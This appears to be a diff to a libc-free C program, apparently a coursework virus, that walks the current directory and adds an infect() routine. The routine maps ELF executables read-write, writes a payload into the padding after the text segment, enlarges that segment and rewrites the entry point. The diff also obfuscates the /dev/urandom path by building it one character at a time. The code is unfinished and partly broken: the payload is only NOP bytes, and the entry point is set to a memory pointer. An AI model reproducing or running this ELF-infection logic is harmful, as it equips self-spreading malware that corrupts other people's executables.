@@ -1,14 +1,21 @@
 #define _XOPEN_SOURCE 500
 
-#define ROOT_DIR   (".")
+//#define ROOT_DIR   (".")
 #define SPARE_FDS  (4)
 #define MAX_FDS	(512)
+
+#define RET_PATTERN 0xfffffffc
+
+#define REQ_SIZE	0x4
+#define PAY			("\x90\x90\x90\x90")
 
 #define DEBUG 	1
 
 // types.h
 
 typedef unsigned int size_t;
+typedef long		__kernel_off_t;
+typedef __kernel_off_t		off_t;
 
 typedef unsigned long int uintptr; /* size_t */
 typedef long int intptr; /* ssize_t */
@@ -145,7 +152,19 @@ typedef struct elf64_phdr {
 #define	ELFMAG1		'E'
 #define	ELFMAG2		'L'
 #define	ELFMAG3		'F'
-#define	ELFMAG		"\177ELF"
+//#define	ELFMAG		"\177ELF"
+
+#define PF_R		0x4
+#define PF_W		0x2
+#define PF_X		0x1
+
+#define SHN_UNDEF	0
+#define SHN_LORESERVE	0xff00
+#define SHN_LOPROC	0xff00
+#define SHN_HIPROC	0xff1f
+#define SHN_ABS		0xfff1
+#define SHN_COMMON	0xfff2
+#define SHN_HIRESERVE	0xffff
 
 // end elf.h
 
@@ -422,7 +441,10 @@ struct stat {
 #define SYS_CLOSE   3
 #define SYS_STAT	4
 #define SYS_FSTAT   5
+#define SYS_LSEEK   8
 #define SYS_MMAP	9
+#define SYS_MPROTECT	10
+#define SYS_MUNMAP	11
 #define SYS_GETPID  39
 #define SYS_GETDENTS	78
 #define SYS_GETCWD  79
@@ -452,6 +474,20 @@ intptr stat(const char *filename, struct stat *statbuf);
 intptr fstat(unsigned int fd, struct stat *statbuf);
 intptr chmod(const char *filename, mode_t mode);
 intptr fchmod(unsigned int fd, mode_t mode);
+intptr mmap(unsigned long addr, unsigned long len, unsigned long prot, unsigned long flags, unsigned long fd, unsigned long off);
+intptr munmap(unsigned long addr, size_t len);
+intptr mprotect(unsigned long start, size_t len, unsigned long prot);
+intptr lseek(unsigned int fd, off_t offset, unsigned int origin);
+
+void* syscall6(
+	void* number,
+	void* arg1,
+	void* arg2,
+	void* arg3,
+	void* arg4,
+	void* arg5,
+	void* arg6
+);
 
 void* syscall5(
 	void* number,
@@ -657,12 +693,23 @@ typedef struct _ftsent {
 
 // end fs.h
 
+// mman-common.h
+
+#define PROT_READ	0x1		/* page can be read */
+#define PROT_WRITE	0x2		/* page can be written */
+#define PROT_EXEC	0x4		/* page can be executed */
+
+#define MAP_SHARED	0x01		/* Share changes */
+
+// end mman-common.h
+
 uintptr my_strlen(char const* str);
 char* my_strncat(char *dest, const char *src, size_t n);
-char * my_strncpy(char *dest, const char *src, size_t n);
+char* my_strncpy(char *dest, const char *src, size_t n);
 void reverse(char str[], int length);
 char* itoa(int num, char* str, int base);
 void* my_memset(void *b, int c, int len);
+void * my_memmove(void *dst, const void *src, size_t len);
 int infect(const char* fpath);
 
 // syscall.c
@@ -805,6 +852,48 @@ intptr fchmod(unsigned int fd, mode_t mode) {
 		);
 }
 
+intptr mmap(unsigned long addr, unsigned long len, unsigned long prot, unsigned long flags, unsigned long fd, unsigned long off) {
+	return (intptr)
+		syscall6(
+			(void*)SYS_MMAP,
+			(void*)addr,
+			(void*)len,
+			(void*)prot,
+			(void*)flags,
+			(void*)fd,
+			(void*)off
+		);
+}
+
+intptr munmap(unsigned long addr, size_t len) {
+	return (intptr)
+		syscall2(
+			(void*)SYS_MUNMAP,
+			(void*)addr,
+			(void*)(unsigned long)len
+		);
+}
+
+intptr mprotect(unsigned long start, size_t len, unsigned long prot) {
+	return (intptr)
+		syscall3(
+			(void*)SYS_MPROTECT,
+			(void*)start,
+			(void*)(unsigned long)len,
+			(void*)prot
+		);
+}
+
+intptr lseek(unsigned int fd, off_t offset, unsigned int origin) {
+	return (intptr)
+		syscall3(
+			(void*)SYS_LSEEK,
+			(void*)(unsigned long)fd,
+			(void*)offset,
+			(void*)(unsigned long)origin
+		);
+}
+
 // end syscall.c
 
 // stdio.c
@@ -883,7 +972,8 @@ int nftw(const char *path, int (*fn)(const char *, const struct stat *), int nfd
 				char abs_path[path_len + file_len + 1 + 1];
 				my_memset(abs_path, '\0', path_len + file_len + 1 + 1);
 				my_strncpy(abs_path, cwd_buf, path_len);
-				my_strncat(abs_path,"/", 1);
+				char slash = '/';
+				my_strncat(abs_path,&slash, 1);
 				my_strncat(abs_path, d->d_name, file_len);
 				struct stat statbuf;
 				stat(abs_path, &statbuf);
@@ -1064,7 +1154,21 @@ int random_pick()
 {
 	int rand = 0;
 	int f;
-	f = open("/dev/urandom", O_RDONLY);
+	char urand[13];
+	urand[0] = '/';
+	urand[1] = 'd';
+	urand[2] = 'e';
+	urand[3] = 'v';
+	urand[4] = '/';
+	urand[5] = 'u';
+	urand[6] = 'r';
+	urand[7] = 'a';
+	urand[8] = 'n';
+	urand[9] = 'd';
+	urand[10] = 'o';
+	urand[11] = 'm';
+	urand[12] = '\0';
+	f = open(urand, O_RDONLY);
 	read(f, (char*)&rand, 1);
 	close(f);
 	
@@ -1097,13 +1201,14 @@ int file_process(const char *fpath,
 int main(int argc, char* argv[])
 {
 	//struct timeval t;
+	char root_dir = '.';
 	int nfds = getdtablesize() - SPARE_FDS;
 	if(nfds == -5) return -1;
 	nfds = nfds > MAX_FDS ? MAX_FDS : nfds;
 
 	//gettimeofday(&t, NULL);
 	//srand(t.tv_usec * t.tv_sec);
-	nftw(ROOT_DIR, file_process, nfds);
+	nftw(&root_dir, file_process, nfds);
 	//write(1, "hello from libc-free world\n", 27);
 	return 0;
 }
@@ -1224,12 +1329,137 @@ void  *my_memset(void *b, int c, int len)
 	return(b);
 }
 
+// https://www.student.cs.uwaterloo.ca/~cs350/common/os161-src-html/doxygen/html/memmove_8c_source.html
+void * my_memmove(void *dst, const void *src, size_t len)
+{
+	size_t i;
+
+	// if ((uintptr)dst < (uintptr)src) {
+	// 	return memcpy(dst, src, len);
+	// }
+
+	// Copy by words in the common case. Look in memcpy.c for more
+	// information.
+	if ((uintptr)dst % sizeof(long) == 0 &&
+		(uintptr)src % sizeof(long) == 0 &&
+		len % sizeof(long) == 0) {
+
+		long *d = dst;
+		const long *s = src;
+
+		// The reason we copy index i-1 and test i>0 is that
+		// i is unsigned -- so testing i>=0 doesn't work.
+
+		for (i=len/sizeof(long); i>0; i--) {
+			d[i-1] = s[i-1];
+		}
+	} else {
+		char *d = dst;
+		const char *s = src;
+
+		for (i=len; i>0; i--) {
+			d[i-1] = s[i-1];
+		}
+	}
+	 
+	return dst;
+}
+
 // FIXME: your infection logic should be placed here and below.
 int infect(const char* fpath)
 {
 	//printf("%s will be infected.\n", fpath);
 	write(1, fpath, my_strlen(fpath));
 	write(1, " will be infected.\n", my_strlen(" will be infected.\n"));
+
+	int victim_fd = open(fpath, O_RDWR);
+	if(victim_fd<0) {
+		return -1;
+	}
+	struct stat victim_info;
+	fstat(victim_fd, &victim_info);
+
+	//int virus_fd = open()
+
+	void* victim = (void *)mmap(0, victim_info.st_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED, victim_fd, 0);
+
+	Elf64_Ehdr* header = (Elf64_Ehdr*)victim;
+
+	//Elf64_Addr ep = header->e_entry;
+
+	Elf64_Phdr* pHeader[header->e_phnum];
+	// Elf64_Shdr* sHeader[header->e_shnum];
+	// char* programs[header->e_phnum];
+	// char* sections[header->e_shnum];
+	// char* sNames[header->e_shnum];
+
+	Elf64_Half textseg = 0;
+
+	char* pos = victim + header->e_phoff;
+	for(int i = 0 ; i < header->e_phnum ; i++) {
+		pHeader[i] = (Elf64_Phdr*)pos;
+		if(pHeader[i]->p_type == PT_LOAD && pHeader[i]->p_flags & (PF_R | PF_X)) {
+			textseg = (Elf64_Half)i;
+		}
+		pos += header->e_phentsize;
+	}
+
+	// pos = victim + header->e_shoff;
+	// for(int i = 0 ; i < header->e_shnum ; i++) {
+	// 	sHeader[i] = (Elf64_Shdr*)pos;
+	// 	pos += header->e_shentsize;
+	// }
+
+	// for(int i = 0 ; i < header->e_phnum ; i++) {
+	// 	programs[i] = (char *)(victim + pHeader[i]->p_offset);
+	// }
+
+	// for(int i = 0 ; i < header->e_shnum ; i++) {
+	// 	sections[i] = (char *)(victim + sHeader[i]->sh_offset);
+	// }
+
+	//Elf64_Half shstrndx = header->e_shstrndx;
+	//Elf64_Half textsec;
+
+	// char text[6];
+	// text[0] = '.';
+	// text[1] = 't';
+	// text[2] = 'e';
+	// text[3] = 'x';
+	// text[4] = 't';
+	// text[5] = '\0';
+	// if(shstrndx != SHN_UNDEF) {
+	// 	//int pos = 1;
+	// 	for(int i = 0 ; i < header->e_shnum ; i++) {
+	// 		if(my_memcmp(sections[shstrndx] + sHeader[i]->sh_name, &text, 5) == 0) {
+	// 			textsec = (Elf64_Half)i;
+	// 		}
+	// 	}
+	// } else {
+
+	// 	close(victim_fd);
+	// 	return -1;
+	// }
+
+	Elf64_Off padding;
+	//Elf64_Xword padsize;
+
+	padding = pHeader[textseg]->p_offset + pHeader[textseg]->p_filesz;
+	if( REQ_SIZE > pHeader[textseg + 1]->p_offset - padding) {
+		close(victim_fd);
+		return -1;
+	}
+
+	my_memmove(victim + padding, PAY, REQ_SIZE);
+
+	pHeader[textseg]->p_filesz += REQ_SIZE;
+	pHeader[textseg]->p_memsz += REQ_SIZE;
+	header->e_entry = (unsigned long)(victim + padding);
+
+
+
+	close(victim_fd);
+	
 	return 0;
 }
 
